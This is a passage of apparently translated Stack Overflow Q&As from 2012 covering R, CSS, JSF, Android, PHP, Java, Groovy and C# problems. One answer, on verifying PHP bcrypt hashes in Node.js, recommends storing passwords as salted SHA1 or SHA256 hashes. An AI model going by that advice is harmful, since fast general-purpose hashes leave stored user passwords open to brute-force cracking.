`System.Security.Cryptography.RNGCryptoServiceProvider.GetNonZeroBytes()`[*Windows Phone*](http://msdn.microsoft.com/en-us/library/system.security.cryptography.rngcryptoserviceprovider%28v=vs.95%29.aspx) 7不[支持](http://msdn.microsoft.com/en-us/library/system.security.cryptography.rngcryptoserviceprovider%28v=vs.95%29.aspx)。您可能想[`RNGCryptoServiceProvider.GetBytes()`](http://msdn.microsoft.com/en-us/library/system.security.cryptography.rngcryptoserviceprovider.getbytes%28v=vs.95%29.aspx)改用它，它也具有强大的加密功能。

# r - R 重音字符

> ID：13537252
> 
> 赞同：2
> 
> 时间：2012-11-24T00:37:50.550
> 
> 标签：r

我在 Win 7 x64 上使用 R 版本 2.15.2 (2012-10-26) 和 RStudio 版本 0.97.168，语言环境为 English_United Kingdom.1252。

我想使用 'gsub' 将 'christian grgić' 替换为 'christian grgi[ćc]' （后面的字符串稍后将用作正则表达式来查找重音和非重音版本的名称）。

然而，R 似乎没有将 ć 识别为带重音的 c。这段代码

```
name <- "christian grgić"
gsub("ć","[cć]",name) 
```

给出这个输出

```
[1] "[cc]hristian grgi[cc]" 
```

而不是我想要的：

```
[1] "christian grgi[cć]" 
```

任何帮助深表感谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T01:50:06.077

尝试这个：

```
Encoding(name) <- "UTF-8"
gsub("ć","[cć]",name)
#[1] "christian grgi[cć]" 
```

请注意，这是我从 sessionInfo() 获得的本地信息：

```
> locale: [1]
> en_US.UTF-8/en_US.UTF-8/en_US.UTF-8/C/en_US.UTF-8/en_US.UTF-8 
```

# r - 如何在 R 中改变对定量的分类反应？

> ID：13537253
> 
> 赞同：1
> 
> 时间：2012-11-24T00:38:04.780
> 
> 标签：r, dataframe, categories

我有一个数据表，其中男性和女性列以及一个有和没有响应的列，我只需要将它们更改为 0 和 1 值，我该怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T01:41:55.167

我怀疑您是否确实需要这样做，但方法如下（假设它们是因素）：

```
numMF <- as.numeric(MFfac) -1 # will be 0 for F and 1 for M in the usual sorting of factor levels 
```

如果它们真的是字符向量，那么将我认为是一个因素的 MFfac 包装起来。或者：

```
numMF <- match(MFvec, c("Female", "Male") ) -1

 match( c("Female","Male", "Female"),  c("Female", "Male") )
[1] 1 2 1 
```

match 函数是数据转换的重要资源。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T04:22:37.477

将因子转换为指标变量的一般方法是使用`model.matrix`函数。但大多数时候您不需要这样做，因为建模函数（例如`lm`）会调用`model.matrix`您。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-24T00:44:09.373

您可以将因子直接强制为数字向量：`as.numeric(factor(x))`. 如果您不喜欢默认级别排序，请使用“factor”的“levels”参数明确指定级别。

# html - 给` `一个负的垂直边距

> ID：13537255
> 
> 赞同：3
> 
> 时间：2012-11-24T00:38:22.440
> 
> 标签：html, css, margin

为什么不能`<span>`有负的垂直边距或填充？

如果我将它设置为`display: block`，它仍然不起作用。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-24T03:56:54.940

从 CSS 2.1 规范：

> ## 8.3 边距属性：'margin-top'、'margin-right'、'margin-bottom'、'margin-left'和'margin'
> 
> 边距属性指定框的边距区域的宽度。'margin' 速记属性设置所有四个边的边距，而其他边距属性只设置它们各自的边。这些属性适用于所有元素，但**垂直边距不会对未替换的内联元素产生任何影响。**

`<span>`默认情况下，是不可替换的内联元素。

还

> ## 8.4 填充属性：'padding-top'、'padding-right'、'padding-bottom'、'padding-left'和'padding'
> 
> ...
> 
> 与边距属性不同，填充值的值不能为负数。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-24T00:48:38.677

也许您的浏览器不支持此功能？负边距`span`是可能的。这样一个简单的例子在 Firefox 和 Chrome 中对我有用：

```
<span style="display:block; margin-left:-20px;">My text.</span> 
```

# php - 验证在 NodeJS 中使用 php crypt() 生成的哈希？

> ID：13537259
> 
> 赞同：2
> 
> 时间：2012-11-24T00:38:47.370
> 
> 标签：php, node.js, authentication, cryptography, openssl

我有一个 PHP 5.3 网络服务器，上面运行着 Lithium 框架。

我有生成的密码哈希`CRYPT_BLOWFISH`：

```
public static function hash($password, $salt = null) {
    return crypt($password, $salt ?: static::salt());
} 
```

他们得到了检查：

```
public static function check($password, $hash) {
    return String::compare(crypt($password, $hash), $hash);
} 
```

我正在寻找`NodeJS`可以让我检查和生成类似哈希的脚本：

到目前为止我已经尝试过了（现在检查）：

```
var c = crypto.createCipher('bf-cfb', password);
var res = c.update(hash);
res += c.final('utf8'); 
```

哪里（不是确切的变量，但看起来像这样）：

```
var hash = '$2a$10$nA5CV2XWJGn0cbKxSHU3GOp29ypHNVJDglJ0iNFx2zFkfy3mrsRZK'; // from php
var salt = '$2a$10$nku2zgjB65zLdcVC1BIhG.'; // from php too
var password = 'passwordInClearTextToCheck'; // correct password to check 
```

有没有可能实现？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-08T11:50:55.357

Crypt() 函数使用不同的算法，这不是原始的 Blowfish 加密/解密。由于 node.js 还没有 Crypt() 实现，我建议使用 SHA1/SHA256/其他方法对密码 + 盐进行哈希处理。

# jsf - jsf - 总是使用错误的语言环境

> ID：13537262
> 
> 赞同：2
> 
> 时间：2012-11-24T00:39:08.720
> 
> 标签：jsf, locale

将 glassfish 3.1.2 与 Mojarra 2.1.14 一起使用。

我在 faces-config 中有以下配置（在共享 jar 中）：

```
<locale-config>
    <default-locale>en</default-locale>
    <supported-locale>de</supported-locale>
    <supported-locale>en</supported-locale>
</locale-config>
<resource-bundle>
    <base-name>package.messages</base-name>
    <var>msg</var>
</resource-bundle>

msg.properties - localeValue=english
msg_de.properties - localeValue=german 
```

*在下面的测试 bean 构造函数中正确检索了默认和支持的语言环境。*

无论我做什么，jsf 总是选择德语消息，即使默认的是英语。我的 jvm 语言环境是德语。

**测试默认语言环境：**

打印资源包中的值的空白页面始终打印德文`de`值。

```
<html xmlns="http://www.w3.org/1999/xhtml" 
    xmlns:h="http://java.sun.com/jsf/html">
    <h:head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
    </h:head>
    <h:body>
        #{msg.localeValue}
    </h:body>
</html> 
```

输出：“德语”

**测试默认语言环境：**

但是默认语言环境仍然`en`将其保存在会话变量中并打印出来：

```
public class SessionBean
{
    private Locale locale;

    public SessionBean()
    {
        this.locale = FacesContext.getCurrentInstance().getApplication().getDefaultLocale();
    }

    public Locale getLocale()
    {
        return this.locale;
    }
}

<html xmlns="http://www.w3.org/1999/xhtml"
    xmlns:f="http://java.sun.com/jsf/core" 
    xmlns:h="http://java.sun.com/jsf/html">
    <f:view locale="#{sessionBean.locale}">
        <h:head>
            <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
        </h:head>
        <h:body>
            #{sessionUtilsBean.locale} - #{msg.localeValue}
        </h:body>
    </f:view>
</html> 
```

输出：“en - German”而不是“en - English”

**编辑：**使用当前 FacesContext 中的 #{bean.getViewRootLocale()} 检索到的相同语言环境“en”。

**直接使用“en”：**

```
<html xmlns="http://www.w3.org/1999/xhtml"
    xmlns:f="http://java.sun.com/jsf/core" 
    xmlns:h="http://java.sun.com/jsf/html">
    <f:view locale="en">
        <h:head>
            <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
        </h:head>
        <h:body>
            #{msg.localeValue}
        </h:body>
    </f:view>
</html> 
```

输出：“德语”

**可能是什么原因？**

*我搜索了完整的项目，查看区域设置从未以编程方式设置。*

**编辑：**

当我删除德语属性文件时，使用英文的并且站点以英文显示。

**Edit2：奇怪的观察**

使用诸如omnifaces 之类的el 函数`of:formatDate`以正确的（英文）语言检索数据。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-07-20T09:50:14.913

英文属性文件必须命名`msg_en.properties`，有同样的问题。

# android - 关闭应用程序的问题

> ID：13537263
> 
> 赞同：1
> 
> 时间：2012-11-24T00:39:23.837
> 
> 标签：android

我正在开发一个 android 项目，我在关闭问题时遇到了一点问题。我的问题是我想在关闭应用程序之前使用文本到语音。但它只是关闭而不是谈论我该如何解决这种情况。这是代码我有

```
 if (item.getTitle()== "ExitItem"){

            say("Bye Master,May The Force Be With You");

                finish(); 
```

我相信这很容易，但由于时间很晚，我再也无法正确思考：DD 无论如何，祝你有美好的一天

```
 public void say(String text2say){
    talker.speak(text2say, TextToSpeech.QUEUE_FLUSH, null);
}

@Override
    public void onInit(int status) {

}
@Override
public void onDestroy() {
    if (talker != null) {
        talker.stop();
        talker.shutdown();
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T01:14:52.257

我不确定这是否会完全解决问题，并且您只发布了一些代码，但我注意到的第一件事是您正在使用`==`比较字符串，这是一种不好的做法。

尝试将其更改为：

```
if (item.getTitle().equals("ExitItem") { 
```

此外，如果该`say`方法是异步执行的，那么`finish()`可能会在该`say`方法有机会做任何事情之前被调用和执行。

**编辑：**由于它是异步完成的，因此您将需要使用 onUtteranceCompleted 来捕捉文本到语音短语的说出时间。

```
TextToSpeech tts = new TextToSpeech(context, new OnInitListener() {

 @Override
 public void onInit(int status) {

    mTts.setOnUtteranceCompletedListener(new OnUtteranceCompletedListener() {

        @Override
        public void onUtteranceCompleted(String utteranceId) {

            runOnUiThread(new Runnable() {

                @Override
                public void run() {
                    finish();
                }
            });
        }
    });

 }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T01:55:51.523

**onUtteranceCompleted**和**OnUtteranceProgress**将帮助您跟踪通话进度。相应地放置finish()。

# ruby-on-rails - 具有电子邮件信函变量的富文本编辑器，已本地化

> ID：13537266
> 
> 赞同：3
> 
> 时间：2012-11-24T00:39:59.267
> 
> 标签：ruby-on-rails, content-management-system, wysiwyg, rich-text-editor

我有一封我们发送的录取电子邮件。它有一些用户生成的数据。标准的 erb 电子邮件模板没问题，对吧？但改变它需要重新部署。我们也需要它的多种语言。我想要一个管理界面，我们有维护这些文本的人。也许在某些富文本编辑器中使用 {{variable}}，以便在发送电子邮件时在 Ruby 中替换？还是使用轻量级 CMS？

总结：

*   富文本
*   数据中的变量来填充它们
*   本土化

变量（来自 db）不需要本地化，只需要周围的内容。

有什么建议么？

# android - 如何在 Activity 和 FragmentActivity 之间共享 sqlite 数据源？

> ID：13537270
> 
> 赞同：0
> 
> 时间：2012-11-24T00:40:29.633
> 
> 标签：android, sqlite, android-fragments, android-activity, listactivity

我使用 Eclipse 创建主从流，现在想在主从流中的列表活动（类型`FragmentActivity`）和我创建的另一个活动（类型）之间使用 sqlite 数据源`Activity`。

我做了一些阅读，为了只有一个 sqlite 数据源实例，人们建议创建一个基本活动（类型为`Activity`，包含数据源），然后将其扩展到所有其他活动。这样我就可以从超类中获取资源......这一切都很好，但我不能在主细节流的列表活动中扩展基本活动，因为它扩展`FragmentActivity`而不是`Activity`......

有什么建议么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T01:26:05.063

我认为 WarrenFaith 在他的评论中建议的是扩展`Application`类，这样您就可以维护一个`static`可以从任何应用程序组件访问的全局对象。

例子...

```
public class MyApp extends Application {

    public static MyObject obj = null;

    public void onCreate() {

        obj = new MyObject();
        ...
    }

    ...
} 
```

然后，您将按如下方式从您的`Activity`或您的访问对象...`FragmentActivity`

```
MyApp.obj.someMethod(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T00:55:21.877

不确定这会有所帮助，但我还是会在这里分享一些我所做的事情，也许会有所帮助。

在使用片段时，我在片段上使用 getActivity() 来传递到我的 SQLite DS 对象。这将返回与片段关联的 Activity。

在 FragmentActivity 上，我看到一个名为 getParent() 的方法，它根据 FragmentActivity 的使用方式返回父 Activity。

# javascript - 用他们的脚本加载用 infinitscroll.js 加载的新帖子？

> ID：13537271
> 
> 赞同：0
> 
> 时间：2012-11-24T00:40:59.957
> 
> 标签：javascript, jquery, wordpress, infinite-scroll

我正在使用带有 wordpress 的 infinitscroll.js 进行帖子分页。

在我的 content-post-audio.php 中，当 infinitscroll 加载新帖子时，我使用脚本调用 jplayer.js（创建 HTML 音频播放器的脚本）所有具有 jplayer 调用但没有 jplayer 调用的音频类型帖子。

我试图让 infinitscroll 加载我的脚本，但该脚本必须单独加载到每个帖子中，因为它使用帖子唯一 ID。这是我的脚本：

```
<script type="text/javascript">
  jQuery(document).ready(function($){
   setTimeout(function() {
      if($().jPlayer) {
      $("#jquery_jplayer_<?php echo $post_id;?>").jPlayer({ready:function(){
        $(this).jPlayer("setMedia", {
            <?php if($mp3 != '') : ?>
            mp3: "<?php echo $mp3; ?>",
            <?php endif; ?>
            <?php if($ogg != '') : ?>
            oga: "<?php echo $ogg; ?>",
            <?php endif; ?>
            end:""});
    },
    swfPath: "<?php echo get_template_directory_uri(); ?>/library/scripts",
    cssSelectorAncestor: "#jp_interface_<?php echo $post_id; ?>",
    supplied: "<?php if($ogg != '') : ?>oga,<?php endif; ?>
                       <?php if($mp3 !='') : ?>mp3, <?php endif; ?> all"});

    }}, 100);
    });
</script> 
```

有没有帮助通过 jplayer 调用加载由 infinitscroll 加载的新音频帖子？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-21T10:12:22.913

与 audio.js 和简单的旧 WordPress 分页有类似的问题。（没有无限滚动） - 修复非常简单，将 html5 音频标签上的 preload 属性更改为 none 和 viola.... 就像一个魅力。

我完全不知道你是否可以在 jPlayer 中应用这种选项，但至少对于 html5 版本的播放器，它必须加载音频标签，我认为插件选项中应该有一些可用的东西。

# bash - 用此命令替换字符串

> ID：13537272
> 
> 赞同：1
> 
> 时间：2012-11-24T00:41:01.143
> 
> 标签：bash, sed, grep

```
find /home -iname ".htaccess" -exec grep -l "FollowSymLinks" {} \; 
```

我是否将 SED 添加到 -exec 中，以便可以查找和替换：

```
 +FollowSymLinks to +SymLinksIfOwnerMatch 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T00:45:11.073

你可以做：

```
find /home -iname ".htaccess" -exec sed -i "s/FollowSymLinks/SymLinksIfOwnerMatch/g" {} \; 
```

# php - php代理不再工作

> ID：13537273
> 
> 赞同：1
> 
> 时间：2012-11-24T00:41:10.513
> 
> 标签：php, proxy

我有一个自定义的 php 代理类 =>

```
class Proxy
{
    private $proxy,
            $header,
            $timeout,
            $agent;

    public function __construct($proxy, $header = null, $timeout = null, $agent = null) {
        $this->proxy   = $proxy;
        $this->header  = empty($header)  ? 1 : $header;
        $this->timeout = empty($timeout) ? 5 : $timeout;
        $this->agent   = empty($agent)   ? "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8" : $agent;
    }

    public function set_proxy($proxy) {
        $this->proxy = $proxy;
    }

    public function get_page($url, $referer = "http://www.google.com/") {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, $this->header);

        curl_setopt($ch, CURLOPT_PROXY, $this->proxy);
        curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $this->timeout);
        curl_setopt($ch, CURLOPT_REFERER, $referer);
        curl_setopt($ch, CURLOPT_USERAGENT, $this->agent);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $result = array();
        $result['exe'] = curl_exec($ch);
        $result['inf'] = curl_getinfo($ch);
        $result['err'] = curl_error($ch);

        curl_close($ch);

        return $result;
    }
} 
```

我喜欢这样=>

```
 $proxy = new Proxy("PROXY_IP:PROXY_PORT");
    $content = $proxy->get_page($url); 
```

直到几天前，一切都运行良好。现在我不断收到主要与`Received HTTP code 403 from proxy after CONNECT`. 由于我不知道未经修改的代码如何停止工作 - 我什至不知道如何调试这个问题。

任何帮助，将不胜感激。谢谢！

编辑：我知道 403 状态码是什么意思，我只是说无论我使用什么代理，无论我尝试使用哪个页面，我都会得到 403。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T00:43:46.923

了解您的状态代码：[http ://en.wikipedia.org/wiki/List_of_HTTP_status_codes](http://en.wikipedia.org/wiki/List_of_HTTP_status_codes)

`403`意思是“禁止”。我猜您代理或代理的那个人认为您不够值得信赖，无法使用他们的服务。或者您访问的真实代理现在有密码。

# python - 为什么这个 Python 正则表达式代码只能找到空结果？

> ID：13537275
> 
> 赞同：0
> 
> 时间：2012-11-24T00:41:42.867
> 
> 标签：python, html, regex, parsing, css

我的代码是：

```
 matches = re.search('(<meta.*?>)', contents, re.DOTALL)
    if matches:
        for group in matches.groups():
            metas.append(group)
    title = re.search('(<title>.*?</title>)', contents, re.DOTALL)
    if title.groups():
        found_title = title.group(1) + '\n'
    else:
        found_title = '' 
```

它正在处理具有元和标题标签（小写）的 HTML 页面，因此我希望元标签和非空标题有多个匹配项。在正则表达式周围添加或删除括号似乎没有什么区别。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T00:50:37.247

`re.search`搜索第一个匹配项。您需要使用`re.findall`或`re.finditer`。

# java - 对损坏的 .exe 文件的字节进行加密

> ID：13537280
> 
> 赞同：0
> 
> 时间：2012-11-24T00:42:49.917
> 
> 标签：java

当我写回加密的字节时，我的 .exe 文件似乎已损坏。

```
 static byte[] read(String inputfn){
        send("Reading file: " + inputfn);
        File file = new File(inputfn);
        send("File size: " + file.length());
        byte[] result = null;
        try {
          InputStream input =  new BufferedInputStream(new FileInputStream(file));
          result = readclose(input);
        }
        catch (FileNotFoundException ex){
          send(ex);
        }
        return result;
      }

  static byte[] readclose(InputStream input2){ 
        bk = new byte[1000*1024]; 
        ByteArrayOutputStream result = null; 
        try  {
          try {
            result = new ByteArrayOutputStream(bk.length);
            int bytesRead = 0;
            while(bytesRead != -1){
              bytesRead = input2.read(bk);
              if(bytesRead > 0){
                result.write(bk, 0, bytesRead);
              }
            }
              crypted = xe.encrypt(bk, 1, 100);
             // send(crypted);
              send("Writing new file: "+ DIR_OUT.toString());
             // OP = crypted.getBytes();
             // byte[] PP = result.getBytes();
              //write(bk,DIR_OUT);

          }
          finally {
            input2.close();
          }
        }
        catch (IOException ex){
          send(ex);
        }
        return result.toByteArray();
      } 
```

变量 bk 等于放回文件中的字节，我如何使它成为正在输入的文件字节的长度？我只希望它加密文件中的字节。我必须将其设为 1000，以便可以加密所有文件字节，否则它只会加密一些。

此外，一旦字节被加密，为了使 .exe 工作，我是否必须在写入之前转换回 base64string？（那会完全取消加密）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T00:57:02.867

bk 只是你的缓冲区。你为什么要加密它？您要加密的是结果的内容。crypted = xe.encrypt(result.toByteArray(), 1, 100); 如果你这样做，那么 bk 有多大也没关系。

# shell - Groovy 执行一个 git shell 命令

> ID：13537281
> 
> 赞同：3
> 
> 时间：2012-11-24T00:42:51.803
> 
> 标签：shell, groovy

我正在尝试在 groovy 中执行 git shell 命令。第一个执行良好，但第二个返回退出代码 128：

```
 def workingDir = new File("path/to/dir")
   "git add .".execute(null, workingDir)
   def p = "git reset --hard".execute( null, workingDir )
   p.text.eachLine {println it}
   println p.exitValue() 
```

这段代码有什么问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-04-16T22:09:34.170

第二个过程在第一个过程完成之前开始。当第二个 git 进程启动时，git 会识别出同一目录中已经有一个 git 进程在运行，这可能会导致问题，因此会出错。如果您从第一个进程读取错误流，您将看到如下内容：

```
fatal: Unable to create 'path/to/dir/.git/index.lock': File exists.

If no other git process is currently running, this probably means a
git process crashed in this repository earlier. Make sure no other git
process is running and remove the file manually to continue. 
```

如果您在开始第二个之前等待第一个完成，那应该可以。像这样的东西：

```
def workingDir = new File("path/to/dir/")

def p = "git add .".execute(null, workingDir)
p.waitFor()
p = "git reset --hard".execute( null, workingDir )
p.text.eachLine {println it}
println p.exitValue() 
```

# c# - 具有 Code First Entity Framework 的数据访问层、模型层和 POCO 类

> ID：13537285
> 
> 赞同：2
> 
> 时间：2012-11-24T00:44:15.653
> 
> 标签：c#, entity-framework, code-first, poco, data-access-layer

我正在遵循“Programming Entity Framework Code First”中提出的建议架构路径。

在 VS 中有一个 DataAccess 层和一个 Model 层，它们都形成了单独的项目。

模型层包含我的业务对象类。DataAccess 层具有对 Model 项目的引用，因此它可以为我的每个业务对象创建上下文和 DbSet。

问题是模型中的某些类需要访问数据层来执行计算，但是我不能在模型项目中引用数据访问层，因为它会创建循环引用。DataAccess 层必须引用 Model 层，以便它可以创建 DbSet。另请注意，计算是只读的——只有 getter，不会持久化到数据库中。

我已经为此搜索了几个小时并找到了有用的信息，但我想我错过了一些简单的东西？POCO 类本来就是简单的，但我的类代表的东西有一些非常相关但更复杂的计算。

作为一个简单的具体示例，我有一个 Transaction 类和一个 AccountBalance 类。Transaction 类需要知道特定日期的 AccountBalance 以用于显示目的——例如百分比变化（这只是一个简单的示例）：

公共类事务

```
{
    public DateTime Date { get; set; }
    public string Description { get; set; }    
        ... etc    
    public double PercentageChange
    {
        get
        {
            // return TransactionAmount / AccountBalance on TransactionDate    
            //  however Transaction has no knowledge of AccountBalance... 
         }
    }
} 
```

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T01:00:12.790

就我个人而言，我不会*将*业务逻辑放在我的 POCO 中。恕我直言，您需要创建一个单独的服务层（或您所称的任何名称）并将业务逻辑放在那里。POCO 应该是没有任何业务逻辑的简单对象。

因此，您的架构将如下所示：

GUI -> 服务层 -> 数据访问层（存储库？） -> 数据库。

现在您的所有项目都可以引用您的模型层。

# c# - xmlserializer.deserialize() 创建新对象而不是读取我希望它读取的对象

> ID：13537289
> 
> 赞同：0
> 
> 时间：2012-11-24T00:44:43.970
> 
> 标签：c#, wcf, wcf-rest

所以当我尝试使用时：

```
 WebRequest request = WebRequest.Create("http://localhost:9998/API/GetGameById/" + ID.ToString());
        WebResponse ws = request.GetResponse();
        StreamReader responseStream = new StreamReader(ws.GetResponseStream());
        string response = responseStream.ReadToEnd();

        Game game;

        using (MemoryStream Stream = new MemoryStream(UTF8Encoding.Default.GetBytes(response)))
        {
            XmlSerializer Serializer = new XmlSerializer(typeof(Game));
            game = Serializer.Deserialize(Stream) as Game;
        }
        responseStream.Close();
        return game; 
```

返回的“游戏”与 xmlstring“响应”中的游戏具有不同的属性，就像：

```
 game = Serializer.Deserialize(Stream) as Game; 
```

创建一个游戏对象的新实例，而不是给我指定 ID 的游戏

“字符串响应”锁定如下：

```
 <Game xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
    <Gameboard i:nil="true" xmlns:a="http://schemas.microsoft.com/2003/10/Serialization/Arrays"/>
    <Id>1</Id>
    <Players xmlns:a="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
       <a:int>1</a:int>
    </Players>
    <hsize>0</hsize>
    <vsize>0</vsize>
    <winner>0</winner>
 </Game> 
```

但是返回标记处的游戏会像这样锁定

```
 <Game xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
    <Gameboard i:nil="true" xmlns:a="http://schemas.microsoft.com/2003/10/Serialization/Arrays"/>
    <Id>0</Id>
    <Players i:nil="true" xmlns:a="http://schemas.microsoft.com/2003/10/Serialization/Arrays"/>
    <hsize>0</hsize>
    <vsize>0</vsize>
    <winner>0</winner>
 </Game> 
```

游戏课，如果有帮助的话：

```
[DataContract(Namespace = "")]
[ServiceBehavior(InstanceContextMode = InstanceContextMode.Single)]
public class Game
{
    [DataMember]
    int Id;
    [DataMember]
    int[] Players;
    [DataMember]
    int[] Gameboard;
    [DataMember]
    int hsize;
    [DataMember]
    int vsize;
    [DataMember]
    int winner = 0;

    public Game()
    { }

    public Game(int newgameID)
    {
        Id = ++newgameID;
    }

    public int GetSetId
    {
        get { return Id; }
        set { Id = value; }
    }
    public int[] GetSetGameboard
    {
        get { return Gameboard; }
        set { Gameboard = value; }
    }
    public int GetSetwinner
    {
        get { return winner; }
        set { winner = value; }
    }
    public int[] GetPlayerList
    {
        get { return Players; }
    }

    public void AddPlayer()
    {
        int NewPlayer;
        if (Players == null)
            Players = new int[0];
        List<int> temp = Players.ToList();
        if (temp.Count == 0)
            NewPlayer = 1;
        else
        {
            NewPlayer = temp.Last();
            NewPlayer++;
        }
        temp.Add(NewPlayer);
        Players = temp.ToArray();
    }
} 
```

对不起，如果我给了你很多/很少，但这是我的第 3 或第 4 篇文章，所以我还在学习只是问你是否遗漏了什么

非常感谢您抽出宝贵时间帮助我！

祝你有美好的一天！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T00:57:45.887

您可能希望使用[此处演示](http://msdn.microsoft.com/en-us/library/system.runtime.serialization.datacontractattribute.aspx)`DataContractSerializer`的 a而不是 XmlSerializer。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T01:06:57.430

我尝试了这种扩展方法，它可以按预期工作。问题可能是由于 XmlSerializer 不适用于私有字段。

```
public static T DeserializeWithDataContractSerializer<T>(this string xml)
{
    var dataContractSerializer = new DataContractSerializer(typeof(T));
    using (var reader = new XmlTextReader( new StringReader(xml)))
    {
        return (T)dataContractSerializer.ReadObject(reader);
    }
} 
```

```
[Test]
public void GameTest()
{
    string xml =
        @" <Game xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"">
                <Gameboard i:nil=""true"" xmlns:a=""http://schemas.microsoft.com/2003/10/Serialization/Arrays""/>
                <Id>1</Id>
                <Players xmlns:a=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">
                   <a:int>1</a:int>
                </Players>
                <hsize>0</hsize>
                <vsize>0</vsize>
                <winner>0</winner>
             </Game>";
    var game = xml.DeserializeWithDataContractSerializer<Game>();
    Assert.AreEqual(1,game.GetSetId);
} 
```

# java - 没有答案的openfire错误

> ID：13537292
> 
> 赞同：0
> 
> 时间：2012-11-24T00:44:56.940
> 
> 标签：java, linux, openfire

我正在运行 openfire 服务器作为我的聊天服务器的基础，但我对 openfire 的健壮性不满意，它似乎有很多 java 错误，

与我交谈过的 Java 专家说，这都是编码错误，Java 异常没有正确处理。只是想从 java 专家那里知道以下错误真的是 java 编程问题或我的服务器或设置问题。

```
java.lang.IndexOutOfBoundsException: Index: 0, Size: 0
at java.util.ArrayList.RangeCheck(Unknown Source)
at java.util.ArrayList.get(Unknown Source)
at org.logicalcobwebs.proxool.util.FastArrayList.get(FastArrayList.java:475)
at org.logicalcobwebs.proxool.ConnectionPool.getConnection(ConnectionPool.java:184)
at org.logicalcobwebs.proxool.ProxoolDriver.connect(ProxoolDriver.java:89)
at java.sql.DriverManager.getConnection(Unknown Source)
at java.sql.DriverManager.getConnection(Unknown Source)
at org.jivesoftware.database.DefaultConnectionProvider.getConnection(DefaultConnectionProvider.java:86)
at org.jivesoftware.database.DbConnectionManager.getConnection(DbConnectionManager.java:124)
at org.jivesoftware.openfire.spi.PresenceManagerImpl.userUnavailable(PresenceManagerImpl.java:280)
at org.jivesoftware.openfire.handler.PresenceUpdateHandler.process(PresenceUpdateHandler.java:168)
at org.jivesoftware.openfire.handler.PresenceUpdateHandler.process(PresenceUpdateHandler.java:135)
at org.jivesoftware.openfire.handler.PresenceUpdateHandler.process(PresenceUpdateHandler.java:199)
at org.jivesoftware.openfire.PresenceRouter.handle(PresenceRouter.java:149)
at org.jivesoftware.openfire.PresenceRouter.route(PresenceRouter.java:85)
at org.jivesoftware.openfire.spi.PacketRouterImpl.route(PacketRouterImpl.java:84)
at org.jivesoftware.openfire.SessionManager$ClientSessionListener.onConnectionClose(SessionManager.java:1164)
at org.jivesoftware.openfire.net.VirtualConnection.notifyCloseListeners(VirtualConnection.java:214)
at org.jivesoftware.openfire.net.VirtualConnection.close(VirtualConnection.java:190)
at org.jivesoftware.openfire.http.HttpSession$HttpVirtualConnection.systemShutdown(HttpSession.java:1008)
at org.jivesoftware.openfire.spi.LocalRoutingTable.stop(LocalRoutingTable.java:146)
at org.jivesoftware.openfire.spi.RoutingTableImpl.stop(RoutingTableImpl.java:857)
at org.jivesoftware.openfire.XMPPServer.shutdownServer(XMPPServer.java:948)
at org.jivesoftware.openfire.XMPPServer.access$700(XMPPServer.java:146)
at org.jivesoftware.openfire.XMPPServer$ShutdownHookThread.run(XMPPServer.java:898)
2012.11.24 05:50:37 org.jivesoftware.util.log.util.CommonsLogFactory - Problem
java.sql.SQLException: java.lang.IndexOutOfBoundsException: Index: 0, Size: 0
at org.logicalcobwebs.proxool.ConnectionPool.getConnection(ConnectionPool.java:235)
at org.logicalcobwebs.proxool.ProxoolDriver.connect(ProxoolDriver.java:89)
at java.sql.DriverManager.getConnection(Unknown Source)
at java.sql.DriverManager.getConnection(Unknown Source)
at org.jivesoftware.database.DefaultConnectionProvider.getConnection(DefaultConnectionProvider.java:86)
at org.jivesoftware.database.DbConnectionManager.getConnection(DbConnectionManager.java:124)
at org.jivesoftware.openfire.spi.PresenceManagerImpl.userUnavailable(PresenceManagerImpl.java:280)
at org.jivesoftware.openfire.handler.PresenceUpdateHandler.process(PresenceUpdateHandler.java:168)
at org.jivesoftware.openfire.handler.PresenceUpdateHandler.process(PresenceUpdateHandler.java:135)
at org.jivesoftware.openfire.handler.PresenceUpdateHandler.process(PresenceUpdateHandler.java:199)
at org.jivesoftware.openfire.PresenceRouter.handle(PresenceRouter.java:149)
at org.jivesoftware.openfire.PresenceRouter.route(PresenceRouter.java:85)
at org.jivesoftware.openfire.spi.PacketRouterImpl.route(PacketRouterImpl.java:84)
at org.jivesoftware.openfire.SessionManager$ClientSessionListener.onConnectionClose(SessionManager.java:1164)
